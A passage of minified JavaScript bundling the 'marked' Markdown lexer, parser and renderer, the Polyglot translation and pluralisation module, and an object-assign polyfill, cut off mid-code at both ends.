*(?:\\n{2,}|\\s*$))").replace("comment",M._comment).replace(/tag/g,"(?!(?:a|em|strong|small|s|cite|q|dfn|abbr|data|time|code|var|samp|kbd|sub|sup|i|b|u|mark|ruby|rt|rp|bdi|bdo|span|br|wbr|ins|del|img)\\b)\\w+(?!:|[^\\w\\s@]*@)\\b").getRegex(),def:/^ *\[([^\]]+)\]: *<?([^\s>]+)>?(?: +(["(][^\n]+[")]))? *(?:\n+|$)/,heading:/^(#{1,6})(.*)(?:\n+|$)/,fences:O,lheading:/^(.+?)\n {0,3}(=+|-+) *(?:\n+|$)/,paragraph:d(M.normal._paragraph).replace("hr",M.hr).replace("heading"," *#{1,6} *[^\n]").replace("lheading",M.lheading).replace("blockquote"," {0,3}>").replace("|fences","").replace("|list","").replace("|html","").getRegex()});var N={escape:/^\\([!"#$%&'()*+,\-./:;<=>?@\[\]\\^_`{|}~])/,autolink:/^<(scheme:[^\s\x00-\x1f<>]*|email)>/,url:O,tag:"^comment|^</[a-zA-Z][\\w:-]*\\s*>|^<[a-zA-Z][\\w-]*(?:attribute)*?\\s*/?>|^<\\?[\\s\\S]*?\\?>|^<![a-zA-Z]+\\s[\\s\\S]*?>|^<!\\[CDATA\\[[\\s\\S]*?\\]\\]>",link:/^!?\[(label)\]\(\s*(href)(?:\s+(title))?\s*\)/,reflink:/^!?\[(label)\]\[(ref)\]/,nolink:/^!?\[(ref)\](?:\[\])?/,reflinkSearch:"reflink|nolink(?!\\()",emStrong:{lDelim:/^(?:\*+(?:([punct_])|[^\s*]))|^_+(?:([punct*])|([^\s_]))/,rDelimAst:/^(?:[^_*\\]|\\.)*?\_\_(?:[^_*\\]|\\.)*?\*(?:[^_*\\]|\\.)*?(?=\_\_)|(?:[^*\\]|\\.)+(?=[^*])|[punct_](\*+)(?=[\s]|$)|(?:[^punct*_\s\\]|\\.)(\*+)(?=[punct_\s]|$)|[punct_\s](\*+)(?=[^punct*_\s])|[\s](\*+)(?=[punct_])|[punct_](\*+)(?=[punct_])|(?:[^punct*_\s\\]|\\.)(\*+)(?=[^punct*_\s])/,rDelimUnd:/^(?:[^_*\\]|\\.)*?\*\*(?:[^_*\\]|\\.)*?\_(?:[^_*\\]|\\.)*?(?=\*\*)|(?:[^_\\]|\\.)+(?=[^_])|[punct*](\_+)(?=[\s]|$)|(?:[^punct*_\s\\]|\\.)(\_+)(?=[punct*\s]|$)|[punct*\s](\_+)(?=[^punct*_\s])|[\s](\_+)(?=[punct*])|[punct*](\_+)(?=[punct*])/},code:/^(`+)([^`]|[^`][\s\S]*?[^`])\1(?!`)/,br:/^( {2,}|\\)\n(?!\s*$)/,del:O,text:/^(`+|[^`])(?:(?= {2,}\n)|[\s\S]*?(?:(?=[\\<!\[`*_]|\b_|$)|[^ ](?= {2,}\n)))/,punctuation:/^([\spunctuation])/,_punctuation:"!\"#$%&'()+\\-.,/:;<=>?@\\[\\]`^{|}~"};N.punctuation=d(N.punctuation).replace(/punctuation/g,N._punctuation).getRegex(),N.blockSkip=/\[[^\]]*?\]\([^\)]*?\)|`[^`]*?`|<[^>]*?>/g,N.escapedEmSt=/(?:^|[^\\])(?:\\\\)*\\[*_]/g,N._comment=d(M._comment).replace("(?:--\x3e|$)","--\x3e").getRegex(),N.emStrong.lDelim=d(N.emStrong.lDelim).replace(/punct/g,N._punctuation).getRegex(),N.emStrong.rDelimAst=d(N.emStrong.rDelimAst,"g").replace(/punct/g,N._punctuation).getRegex(),N.emStrong.rDelimUnd=d(N.emStrong.rDelimUnd,"g").replace(/punct/g,N._punctuation).getRegex(),N._escapes=/\\([!"#$%&'()*+,\-./:;<=>?@\[\]\\^_`{|}~])/g,N._scheme=/[a-zA-Z][a-zA-Z0-9+.-]{1,31}/,N._email=/[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+(@)[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+(?![-_])/,N.autolink=d(N.autolink).replace("scheme",N._scheme).replace("email",N._email).getRegex(),N._attribute=/\s+[a-zA-Z:_][\w.:-]*(?:\s*=\s*"[^"]*"|\s*=\s*'[^']*'|\s*=\s*[^\s"'=<>`]+)?/,N.tag=d(N.tag).replace("comment",N._comment).replace("attribute",N._attribute).getRegex(),N._label=/(?:\[(?:\\.|[^\[\]\\])*\]|\\.|`[^`]*`|[^\[\]\\`])*?/,N._href=/<(?:\\.|[^\n<>\\])+>|[^\s\x00-\x1f]*/,N._title=/"(?:\\"?|[^"\\])*"|'(?:\\'?|[^'\\])*'|\((?:\\\)?|[^)\\])*\)/,N.link=d(N.link).replace("label",N._label).replace("href",N._href).replace("title",N._title).getRegex(),N.reflink=d(N.reflink).replace("label",N._label).replace("ref",M._label).getRegex(),N.nolink=d(N.nolink).replace("ref",M._label).getRegex(),N.reflinkSearch=d(N.reflinkSearch,"g").replace("reflink",N.reflink).replace("nolink",N.nolink).getRegex(),N.normal=a({},N),N.pedantic=a({},N.normal,{strong:{start:/^__|\*\*/,middle:/^__(?=\S)([\s\S]*?\S)__(?!_)|^\*\*(?=\S)([\s\S]*?\S)\*\*(?!\*)/,endAst:/\*\*(?!\*)/g,endUnd:/__(?!_)/g},em:{start:/^_|\*/,middle:/^()\*(?=\S)([\s\S]*?\S)\*(?!\*)|^_(?=\S)([\s\S]*?\S)_(?!_)/,endAst:/\*(?!\*)/g,endUnd:/_(?!_)/g},link:d(/^!?\[(label)\]\((.*?)\)/).replace("label",N._label).getRegex(),reflink:d(/^!?\[(label)\]\s*\[([^\]]*)\]/).replace("label",N._label).getRegex()}),N.gfm=a({},N.normal,{escape:d(N.escape).replace("])","~|])").getRegex(),_extended_email:/[A-Za-z0-9._+-]+(@)[a-zA-Z0-9-_]+(?:\.[a-zA-Z0-9-_]*[a-zA-Z0-9])+(?![-_])/,url:/^((?:ftp|https?):\/\/|www\.)(?:[a-zA-Z0-9\-]+\.?)+[^\s<]*|^email/,_backpedal:/(?:[^?!.,:;*_'"~()&]+|\([^)]*\)|&(?![a-zA-Z0-9]+;$)|[?!.,:;*_'"~)]+(?!$))+/,del:/^(~~?)(?=[^\s~])([\s\S]*?[^\s~])\1(?=[^~]|$)/,text:/^([`~]+|[^`~])(?:(?= {2,}\n)|(?=[a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-]+@)|[\s\S]*?(?:(?=[\\<!\[`*~_]|\b_|https?:\/\/|ftp:\/\/|www\.|$)|[^ ](?= {2,}\n)|[^a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-](?=[a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-]+@)))/}),N.gfm.url=d(N.gfm.url,"i").replace("email",N.gfm._extended_email).getRegex(),N.breaks=a({},N.gfm,{br:d(N.br).replace("{2,}","*").getRegex(),text:d(N.gfm.text).replace("\\b_","\\b_| {2,}\\n").replace(/\{2,\}/g,"*").getRegex()});var R=function(){function e(e){this.tokens=[],this.tokens.links=Object.create(null),this.options=e||n.defaults,this.options.tokenizer=this.options.tokenizer||new L,this.tokenizer=this.options.tokenizer,this.tokenizer.options=this.options,this.tokenizer.lexer=this,this.inlineQueue=[],this.state={inLink:!1,inRawBlock:!1,top:!0};var t={block:M.normal,inline:N.normal};this.options.pedantic?(t.block=M.pedantic,t.inline=N.pedantic):this.options.gfm&&(t.block=M.gfm,this.options.breaks?t.inline=N.breaks:t.inline=N.gfm),this.tokenizer.rules=t}e.lex=function(n,t){return new e(t).lex(n)},e.lexInline=function(n,t){return new e(t).inlineTokens(n)};var a=e.prototype;return a.lex=function(n){n=n.replace(/\r\n|\r/g,"\n"),this.blockTokens(n,this.tokens);for(var e;e=this.inlineQueue.shift();)this.inlineTokens(e.src,e.tokens);return this.tokens},a.blockTokens=function(n,e){var t,a,r,o,i=this;for(void 0===e&&(e=[]),n=this.options.pedantic?n.replace(/\t/g,"    ").replace(/^ +$/gm,""):n.replace(/^( *)(\t+)/gm,(function(n,e,t){return e+"    ".repeat(t.length)}));n;)if(!(this.options.extensions&&this.options.extensions.block&&this.options.extensions.block.some((function(a){return!!(t=a.call({lexer:i},n,e))&&(n=n.substring(t.raw.length),e.push(t),!0)}))))if(t=this.tokenizer.space(n))n=n.substring(t.raw.length),1===t.raw.length&&e.length>0?e[e.length-1].raw+="\n":e.push(t);else if(t=this.tokenizer.code(n))n=n.substring(t.raw.length),!(a=e[e.length-1])||"paragraph"!==a.type&&"text"!==a.type?e.push(t):(a.raw+="\n"+t.raw,a.text+="\n"+t.text,this.inlineQueue[this.inlineQueue.length-1].src=a.text);else if(t=this.tokenizer.fences(n))n=n.substring(t.raw.length),e.push(t);else if(t=this.tokenizer.heading(n))n=n.substring(t.raw.length),e.push(t);else if(t=this.tokenizer.hr(n))n=n.substring(t.raw.length),e.push(t);else if(t=this.tokenizer.blockquote(n))n=n.substring(t.raw.length),e.push(t);else if(t=this.tokenizer.list(n))n=n.substring(t.raw.length),e.push(t);else if(t=this.tokenizer.html(n))n=n.substring(t.raw.length),e.push(t);else if(t=this.tokenizer.def(n))n=n.substring(t.raw.length),!(a=e[e.length-1])||"paragraph"!==a.type&&"text"!==a.type?this.tokens.links[t.tag]||(this.tokens.links[t.tag]={href:t.href,title:t.title}):(a.raw+="\n"+t.raw,a.text+="\n"+t.raw,this.inlineQueue[this.inlineQueue.length-1].src=a.text);else if(t=this.tokenizer.table(n))n=n.substring(t.raw.length),e.push(t);else if(t=this.tokenizer.lheading(n))n=n.substring(t.raw.length),e.push(t);else if(r=n,this.options.extensions&&this.options.extensions.startBlock&&function(){var e=1/0,t=n.slice(1),a=void 0;i.options.extensions.startBlock.forEach((function(n){"number"==typeof(a=n.call({lexer:this},t))&&a>=0&&(e=Math.min(e,a))})),e<1/0&&e>=0&&(r=n.substring(0,e+1))}(),this.state.top&&(t=this.tokenizer.paragraph(r)))a=e[e.length-1],o&&"paragraph"===a.type?(a.raw+="\n"+t.raw,a.text+="\n"+t.text,this.inlineQueue.pop(),this.inlineQueue[this.inlineQueue.length-1].src=a.text):e.push(t),o=r.length!==n.length,n=n.substring(t.raw.length);else if(t=this.tokenizer.text(n))n=n.substring(t.raw.length),(a=e[e.length-1])&&"text"===a.type?(a.raw+="\n"+t.raw,a.text+="\n"+t.text,this.inlineQueue.pop(),this.inlineQueue[this.inlineQueue.length-1].src=a.text):e.push(t);else if(n){var s="Infinite loop on byte: "+n.charCodeAt(0);if(this.options.silent)break;throw new Error(s)}return this.state.top=!0,e},a.inline=function(n,e){return void 0===e&&(e=[]),this.inlineQueue.push({src:n,tokens:e}),e},a.inlineTokens=function(n,e){var t=this;void 0===e&&(e=[]);var a,r,o,i,s,l,c=n;if(this.tokens.links){var p=Object.keys(this.tokens.links);if(p.length>0)for(;null!=(i=this.tokenizer.rules.inline.reflinkSearch.exec(c));)p.includes(i[0].slice(i[0].lastIndexOf("[")+1,-1))&&(c=c.slice(0,i.index)+"["+g("a",i[0].length-2)+"]"+c.slice(this.tokenizer.rules.inline.reflinkSearch.lastIndex))}for(;null!=(i=this.tokenizer.rules.inline.blockSkip.exec(c));)c=c.slice(0,i.index)+"["+g("a",i[0].length-2)+"]"+c.slice(this.tokenizer.rules.inline.blockSkip.lastIndex);for(;null!=(i=this.tokenizer.rules.inline.escapedEmSt.exec(c));)c=c.slice(0,i.index+i[0].length-2)+"++"+c.slice(this.tokenizer.rules.inline.escapedEmSt.lastIndex),this.tokenizer.rules.inline.escapedEmSt.lastIndex--;for(;n;)if(s||(l=""),s=!1,!(this.options.extensions&&this.options.extensions.inline&&this.options.extensions.inline.some((function(r){return!!(a=r.call({lexer:t},n,e))&&(n=n.substring(a.raw.length),e.push(a),!0)}))))if(a=this.tokenizer.escape(n))n=n.substring(a.raw.length),e.push(a);else if(a=this.tokenizer.tag(n))n=n.substring(a.raw.length),(r=e[e.length-1])&&"text"===a.type&&"text"===r.type?(r.raw+=a.raw,r.text+=a.text):e.push(a);else if(a=this.tokenizer.link(n))n=n.substring(a.raw.length),e.push(a);else if(a=this.tokenizer.reflink(n,this.tokens.links))n=n.substring(a.raw.length),(r=e[e.length-1])&&"text"===a.type&&"text"===r.type?(r.raw+=a.raw,r.text+=a.text):e.push(a);else if(a=this.tokenizer.emStrong(n,c,l))n=n.substring(a.raw.length),e.push(a);else if(a=this.tokenizer.codespan(n))n=n.substring(a.raw.length),e.push(a);else if(a=this.tokenizer.br(n))n=n.substring(a.raw.length),e.push(a);else if(a=this.tokenizer.del(n))n=n.substring(a.raw.length),e.push(a);else if(a=this.tokenizer.autolink(n,v))n=n.substring(a.raw.length),e.push(a);else if(this.state.inLink||!(a=this.tokenizer.url(n,v))){if(o=n,this.options.extensions&&this.options.extensions.startInline&&function(){var e=1/0,a=n.slice(1),r=void 0;t.options.extensions.startInline.forEach((function(n){"number"==typeof(r=n.call({lexer:this},a))&&r>=0&&(e=Math.min(e,r))})),e<1/0&&e>=0&&(o=n.substring(0,e+1))}(),a=this.tokenizer.inlineText(o,b))n=n.substring(a.raw.length),"_"!==a.raw.slice(-1)&&(l=a.raw.slice(-1)),s=!0,(r=e[e.length-1])&&"text"===r.type?(r.raw+=a.raw,r.text+=a.text):e.push(a);else if(n){var d="Infinite loop on byte: "+n.charCodeAt(0);if(this.options.silent)break;throw new Error(d)}}else n=n.substring(a.raw.length),e.push(a);return e},t(e,null,[{key:"rules",get:function(){return{block:M,inline:N}}}]),e}(),q=function(){function e(e){this.options=e||n.defaults}var t=e.prototype;return t.code=function(n,e,t){var a=(e||"").match(/\S*/)[0];if(this.options.highlight){var r=this.options.highlight(n,a);null!=r&&r!==n&&(t=!0,n=r)}return n=n.replace(/\n$/,"")+"\n",a?'<pre><code class="'+this.options.langPrefix+c(a)+'">'+(t?n:c(n,!0))+"</code></pre>\n":"<pre><code>"+(t?n:c(n,!0))+"</code></pre>\n"},t.blockquote=function(n){return"<blockquote>\n"+n+"</blockquote>\n"},t.html=function(n){return n},t.heading=function(n,e,t,a){return this.options.headerIds?"<h"+e+' id="'+(this.options.headerPrefix+a.slug(t))+'">'+n+"</h"+e+">\n":"<h"+e+">"+n+"</h"+e+">\n"},t.hr=function(){return this.options.xhtml?"<hr/>\n":"<hr>\n"},t.list=function(n,e,t){var a=e?"ol":"ul";return"<"+a+(e&&1!==t?' start="'+t+'"':"")+">\n"+n+"</"+a+">\n"},t.listitem=function(n){return"<li>"+n+"</li>\n"},t.checkbox=function(n){return"<input "+(n?'checked="" ':"")+'disabled="" type="checkbox"'+(this.options.xhtml?" /":"")+"> "},t.paragraph=function(n){return"<p>"+n+"</p>\n"},t.table=function(n,e){return e&&(e="<tbody>"+e+"</tbody>"),"<table>\n<thead>\n"+n+"</thead>\n"+e+"</table>\n"},t.tablerow=function(n){return"<tr>\n"+n+"</tr>\n"},t.tablecell=function(n,e){var t=e.header?"th":"td";return(e.align?"<"+t+' align="'+e.align+'">':"<"+t+">")+n+"</"+t+">\n"},t.strong=function(n){return"<strong>"+n+"</strong>"},t.em=function(n){return"<em>"+n+"</em>"},t.codespan=function(n){return"<code>"+n+"</code>"},t.br=function(){return this.options.xhtml?"<br/>":"<br>"},t.del=function(n){return"<del>"+n+"</del>"},t.link=function(n,e,t){if(null===(n=u(this.options.sanitize,this.options.baseUrl,n)))return t;var a='<a href="'+n+'"';return e&&(a+=' title="'+e+'"'),a+">"+t+"</a>"},t.image=function(n,e,t){if(null===(n=u(this.options.sanitize,this.options.baseUrl,n)))return t;var a='<img src="'+n+'" alt="'+t+'"';return e&&(a+=' title="'+e+'"'),a+(this.options.xhtml?"/>":">")},t.text=function(n){return n},e}(),U=function(){function n(){}var e=n.prototype;return e.strong=function(n){return n},e.em=function(n){return n},e.codespan=function(n){return n},e.del=function(n){return n},e.html=function(n){return n},e.text=function(n){return n},e.link=function(n,e,t){return""+t},e.image=function(n,e,t){return""+t},e.br=function(){return""},n}(),$=function(){function n(){this.seen={}}var e=n.prototype;return e.serialize=function(n){return n.toLowerCase().trim().replace(/<[!\/a-z].*?>/gi,"").replace(/[\u2000-\u206F\u2E00-\u2E7F\\'!"#$%&()*+,./:;<=>?@[\]^`{|}~]/g,"").replace(/\s/g,"-")},e.getNextSafeSlug=function(n,e){var t=n,a=0;if(this.seen.hasOwnProperty(t)){a=this.seen[n];do{t=n+"-"+ ++a}while(this.seen.hasOwnProperty(t))}return e||(this.seen[n]=a,this.seen[t]=0),t},e.slug=function(n,e){void 0===e&&(e={});var t=this.serialize(n);return this.getNextSafeSlug(t,e.dryrun)},n}(),W=function(){function e(e){this.options=e||n.defaults,this.options.renderer=this.options.renderer||new q,this.renderer=this.options.renderer,this.renderer.options=this.options,this.textRenderer=new U,this.slugger=new $}e.parse=function(n,t){return new e(t).parse(n)},e.parseInline=function(n,t){return new e(t).parseInline(n)};var t=e.prototype;return t.parse=function(n,e){void 0===e&&(e=!0);var t,a,r,o,i,s,l,c,d,u,m,h,g,f,b,v,y,x,w,k="",S=n.length;for(t=0;t<S;t++)if(u=n[t],!(this.options.extensions&&this.options.extensions.renderers&&this.options.extensions.renderers[u.type])||!1===(w=this.options.extensions.renderers[u.type].call({parser:this},u))&&["space","hr","heading","code","table","blockquote","list","html","paragraph","text"].includes(u.type))switch(u.type){case"space":continue;case"hr":k+=this.renderer.hr();continue;case"heading":k+=this.renderer.heading(this.parseInline(u.tokens),u.depth,p(this.parseInline(u.tokens,this.textRenderer)),this.slugger);continue;case"code":k+=this.renderer.code(u.text,u.lang,u.escaped);continue;case"table":for(c="",l="",o=u.header.length,a=0;a<o;a++)l+=this.renderer.tablecell(this.parseInline(u.header[a].tokens),{header:!0,align:u.align[a]});for(c+=this.renderer.tablerow(l),d="",o=u.rows.length,a=0;a<o;a++){for(l="",i=(s=u.rows[a]).length,r=0;r<i;r++)l+=this.renderer.tablecell(this.parseInline(s[r].tokens),{header:!1,align:u.align[r]});d+=this.renderer.tablerow(l)}k+=this.renderer.table(c,d);continue;case"blockquote":d=this.parse(u.tokens),k+=this.renderer.blockquote(d);continue;case"list":for(m=u.ordered,h=u.start,g=u.loose,o=u.items.length,d="",a=0;a<o;a++)v=(b=u.items[a]).checked,y=b.task,f="",b.task&&(x=this.renderer.checkbox(v),g?b.tokens.length>0&&"paragraph"===b.tokens[0].type?(b.tokens[0].text=x+" "+b.tokens[0].text,b.tokens[0].tokens&&b.tokens[0].tokens.length>0&&"text"===b.tokens[0].tokens[0].type&&(b.tokens[0].tokens[0].text=x+" "+b.tokens[0].tokens[0].text)):b.tokens.unshift({type:"text",text:x}):f+=x),f+=this.parse(b.tokens,g),d+=this.renderer.listitem(f,y,v);k+=this.renderer.list(d,m,h);continue;case"html":k+=this.renderer.html(u.text);continue;case"paragraph":k+=this.renderer.paragraph(this.parseInline(u.tokens));continue;case"text":for(d=u.tokens?this.parseInline(u.tokens):u.text;t+1<S&&"text"===n[t+1].type;)d+="\n"+((u=n[++t]).tokens?this.parseInline(u.tokens):u.text);k+=e?this.renderer.paragraph(d):d;continue;default:var C='Token with "'+u.type+'" type was not found.';if(this.options.silent)return;throw new Error(C)}else k+=w||"";return k},t.parseInline=function(n,e){e=e||this.renderer;var t,a,r,o="",i=n.length;for(t=0;t<i;t++)if(a=n[t],!(this.options.extensions&&this.options.extensions.renderers&&this.options.extensions.renderers[a.type])||!1===(r=this.options.extensions.renderers[a.type].call({parser:this},a))&&["escape","html","link","image","strong","em","codespan","br","del","text"].includes(a.type))switch(a.type){case"escape":o+=e.text(a.text);break;case"html":o+=e.html(a.text);break;case"link":o+=e.link(a.href,a.title,this.parseInline(a.tokens,e));break;case"image":o+=e.image(a.href,a.title,a.text);break;case"strong":o+=e.strong(this.parseInline(a.tokens,e));break;case"em":o+=e.em(this.parseInline(a.tokens,e));break;case"codespan":o+=e.codespan(a.text);break;case"br":o+=e.br();break;case"del":o+=e.del(this.parseInline(a.tokens,e));break;case"text":o+=e.text(a.text);break;default:var s='Token with "'+a.type+'" type was not found.';if(this.options.silent)return;throw new Error(s)}else o+=r||"";return o},e}(),H=function(){function e(e){this.options=e||n.defaults}var t=e.prototype;return t.preprocess=function(n){return n},t.postprocess=function(n){return n},e}();H.passThroughHooks=new Set(["preprocess","postprocess"]),w.options=w.setOptions=function(n){return w.defaults=a({},w.defaults,n),l(w.defaults),w},w.getDefaults=s,w.defaults=n.defaults,w.use=function(){for(var n=w.defaults.extensions||{renderers:{},childTokens:{}},e=arguments.length,t=new Array(e),r=0;r<e;r++)t[r]=arguments[r];t.forEach((function(e){var t=a({},e);if(t.async=w.defaults.async||t.async||!1,e.extensions&&(e.extensions.forEach((function(e){if(!e.name)throw new Error("extension name required");if(e.renderer){var t=n.renderers[e.name];n.renderers[e.name]=t?function(){for(var n=arguments.length,a=new Array(n),r=0;r<n;r++)a[r]=arguments[r];var o=e.renderer.apply(this,a);return!1===o&&(o=t.apply(this,a)),o}:e.renderer}if(e.tokenizer){if(!e.level||"block"!==e.level&&"inline"!==e.level)throw new Error("extension level must be 'block' or 'inline'");n[e.level]?n[e.level].unshift(e.tokenizer):n[e.level]=[e.tokenizer],e.start&&("block"===e.level?n.startBlock?n.startBlock.push(e.start):n.startBlock=[e.start]:"inline"===e.level&&(n.startInline?n.startInline.push(e.start):n.startInline=[e.start]))}e.childTokens&&(n.childTokens[e.name]=e.childTokens)})),t.extensions=n),e.renderer&&function(){var n=w.defaults.renderer||new q;for(var a in e.renderer)!function(t){var a=n[t];n[t]=function(){for(var r=arguments.length,o=new Array(r),i=0;i<r;i++)o[i]=arguments[i];var s=e.renderer[t].apply(n,o);return!1===s&&(s=a.apply(n,o)),s}}(a);t.renderer=n}(),e.tokenizer&&function(){var n=w.defaults.tokenizer||new L;for(var a in e.tokenizer)!function(t){var a=n[t];n[t]=function(){for(var r=arguments.length,o=new Array(r),i=0;i<r;i++)o[i]=arguments[i];var s=e.tokenizer[t].apply(n,o);return!1===s&&(s=a.apply(n,o)),s}}(a);t.tokenizer=n}(),e.hooks&&function(){var n=w.defaults.hooks||new H;for(var a in e.hooks)!function(t){var a=n[t];H.passThroughHooks.has(t)?n[t]=function(r){if(w.defaults.async)return Promise.resolve(e.hooks[t].call(n,r)).then((function(e){return a.call(n,e)}));var o=e.hooks[t].call(n,r);return a.call(n,o)}:n[t]=function(){for(var r=arguments.length,o=new Array(r),i=0;i<r;i++)o[i]=arguments[i];var s=e.hooks[t].apply(n,o);return!1===s&&(s=a.apply(n,o)),s}}(a);t.hooks=n}(),e.walkTokens){var r=w.defaults.walkTokens;t.walkTokens=function(n){var t=[];return t.push(e.walkTokens.call(this,n)),r&&(t=t.concat(r.call(this,n))),t}}w.setOptions(t)}))},w.walkTokens=function(n,e){for(var t,a=[],r=o(n);!(t=r()).done;)!function(){var n=t.value;switch(a=a.concat(e.call(w,n)),n.type){case"table":for(var r,i=o(n.header);!(r=i()).done;){var s=r.value;a=a.concat(w.walkTokens(s.tokens,e))}for(var l,c=o(n.rows);!(l=c()).done;)for(var p,d=o(l.value);!(p=d()).done;){var u=p.value;a=a.concat(w.walkTokens(u.tokens,e))}break;case"list":a=a.concat(w.walkTokens(n.items,e));break;default:w.defaults.extensions&&w.defaults.extensions.childTokens&&w.defaults.extensions.childTokens[n.type]?w.defaults.extensions.childTokens[n.type].forEach((function(t){a=a.concat(w.walkTokens(n[t],e))})):n.tokens&&(a=a.concat(w.walkTokens(n.tokens,e)))}}();return a},w.parseInline=x(R.lexInline,W.parseInline),w.Parser=W,w.parser=W.parse,w.Renderer=q,w.TextRenderer=U,w.Lexer=R,w.lexer=R.lex,w.Tokenizer=L,w.Slugger=$,w.Hooks=H,w.parse=w;var V=w.options,J=w.setOptions,Q=w.use,G=w.walkTokens,X=w.parseInline,K=w,Z=W.parse,Y=R.lex;n.Hooks=H,n.Lexer=R,n.Parser=W,n.Renderer=q,n.Slugger=$,n.TextRenderer=U,n.Tokenizer=L,n.getDefaults=s,n.lexer=Y,n.marked=w,n.options=V,n.parse=K,n.parseInline=X,n.parser=Z,n.setOptions=J,n.use=Q,n.walkTokens=G}(e)},function(n,e,t){"use strict";function a(n,e){var t=function(n){for(var e={},t=s(n),a=0;a<t.length;a+=1)for(var r=t[a][0],o=t[a][1],i=0;i<o.length;i+=1)e[o[i]]=r;return e}(n.pluralTypeToLanguages);return t[e]||t[u.call(e,/-/,1)[0]]||t.en}function r(n){return n.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")}function o(n,e,t,a,r,o){if("string"!=typeof n)throw new TypeError("Polyglot.transformPhrase expects argument #1 to be string");if(null==e)return n;var i=n,s=a||b,l=o||d,p="number"==typeof e?{smart_count:e}:e;if(null!=p.smart_count&&n){var h=r||g,v=u.call(n,m),y=function(n,e,t){return n.pluralTypes[e](t)}(h,f(h,t||"en"),p.smart_count);i=d.call(v[y]||v[0],/^[^\S]*|[^\S]*$/g,"")}return l.call(i,s,(function(n,e){return c(p,e)&&null!=p[e]?p[e]:n}))}function i(n){var e=n||{};this.phrases={},this.extend(e.phrases||{}),this.currentLocale=e.locale||"en";var t=e.allowMissing?o:null;this.onMissingKey="function"==typeof e.onMissingKey?e.onMissingKey:t,this.warn=e.warn||p,this.replaceImplementation=e.replace||d,this.tokenRegex=function(n){var e=n&&n.prefix||"%{",t=n&&n.suffix||"}";if(e===m||t===m)throw new RangeError('"'+m+'" token is reserved for pluralization');return new RegExp(r(e)+"(.*?)"+r(t),"g")}(e.interpolation),this.pluralRules=e.pluralRules||g}var s=t(57),l=t(61),c=t(18),p=function(n){l(!1,n)},d=String.prototype.replace,u=String.prototype.split,m="||||",h=function(n){var e=n%100,t=e%10;return 11!==e&&1===t?0:2<=t&&t<=4&&!(e>=12&&e<=14)?1:2},g={pluralTypes:{arabic:function(n){if(n<3)return n;var e=n%100;return e>=3&&e<=10?3:e>=11?4:5},bosnian_serbian:h,chinese:function(){return 0},croatian:h,french:function(n){return n>=2?1:0},german:function(n){return 1!==n?1:0},russian:h,lithuanian:function(n){return n%10==1&&n%100!=11?0:n%10>=2&&n%10<=9&&(n%100<11||n%100>19)?1:2},czech:function(n){return 1===n?0:n>=2&&n<=4?1:2},polish:function(n){if(1===n)return 0;var e=n%10;return 2<=e&&e<=4&&(n%100<10||n%100>=20)?1:2},icelandic:function(n){return n%10!=1||n%100==11?1:0},slovenian:function(n){var e=n%100;return 1===e?0:2===e?1:3===e||4===e?2:3},romanian:function(n){if(1===n)return 0;var e=n%100;return 0===n||e>=2&&e<=19?1:2},ukrainian:h},pluralTypeToLanguages:{arabic:["ar"],bosnian_serbian:["bs-Latn-BA","bs-Cyrl-BA","srl-RS","sr-RS"],chinese:["id","id-ID","ja","ko","ko-KR","lo","ms","th","th-TH","zh"],croatian:["hr","hr-HR"],german:["fa","da","de","en","es","fi","el","he","hi-IN","hu","hu-HU","it","nl","no","pt","sv","tr"],french:["fr","tl","pt-br"],russian:["ru","ru-RU"],lithuanian:["lt"],czech:["cs","cs-CZ","sk"],polish:["pl"],icelandic:["is","mk"],slovenian:["sl-SL"],romanian:["ro"],ukrainian:["uk","ua"]}},f=function(){var n={};return function(e,t){var r=n[t];return r&&!e.pluralTypes[r]&&(r=null,n[t]=r),r||(r=a(e,t))&&(n[t]=r),r}}(),b=/%\{(.*?)\}/g;i.prototype.locale=function(n){return n&&(this.currentLocale=n),this.currentLocale},i.prototype.extend=function(n,e){for(var t=s(n||{}),a=0;a<t.length;a+=1){var r=t[a][0],o=t[a][1],i=e?e+"."+r:r;"object"==typeof o?this.extend(o,i):this.phrases[i]=o}},i.prototype.unset=function(n,e){if("string"==typeof n)delete this.phrases[n];else for(var t=s(n||{}),a=0;a<t.length;a+=1){var r=t[a][0],o=t[a][1],i=e?e+"."+r:r;"object"==typeof o?this.unset(o,i):delete this.phrases[i]}},i.prototype.clear=function(){this.phrases={}},i.prototype.replace=function(n){this.clear(),this.extend(n)},i.prototype.t=function(n,e){var t,a,r=null==e?{}:e;return"string"==typeof this.phrases[n]?t=this.phrases[n]:"string"==typeof r._?t=r._:this.onMissingKey?a=(0,this.onMissingKey)(n,r,this.currentLocale,this.tokenRegex,this.pluralRules,this.replaceImplementation):(this.warn('Missing translation for key: "'+n+'"'),a=n),"string"==typeof t&&(a=o(t,r,this.currentLocale,this.tokenRegex,this.pluralRules,this.replaceImplementation)),a},i.prototype.has=function(n){return c(this.phrases,n)},i.transformPhrase=function(n,e,t){return o(n,e,t)},n.exports=i},function(n,e,t){"use strict";function a(n){if(null==n)throw new TypeError("Object.assign cannot be called with null or undefined");return Object(n)}
/*
object-assign
(c) Sindre Sorhus
@license MIT
*/var r=Object.getOwnPropertySymbols,o=Object.prototype.hasOwnProperty,i=Object.prototype.propertyIsEnumerable;n.exports=function(){try{if(!Object.assign)return!1;var n=new String("abc");if(n[5]="de","5"===Object.getOwnPropertyNames(n)[0])return!1;for(var e={},t=0;t<10;t++)e["_"+String.fromCharCode(t)]=t;if("0123456789"!==Object.getOwnPropertyNames(e).map((function(n){return e[n]})).join(""))return!1;var a={};return"abcdefghijklmnopqrst".split("").forEach((function(n){a[n]=n})),"abcdefghijklmnopqrst"===Object.keys(Object.assign({},a)).join("")}catch(n){return!1}}()?Object.assign:function(n,e){for(var t,s,l=a(n),c=1;c<arguments.length;c++){for(var p in t=Object(arguments[c]))o.call(t,p)&&(l[p]=t[p]);if(r){s=r(t);for(var d=0;d<s.length;d++)i.call(t,s[d])&&(l[s[d]]=t[s[d]])}}return l}},function(n,e,t){"use strict";var a;if(!Object.keys){var 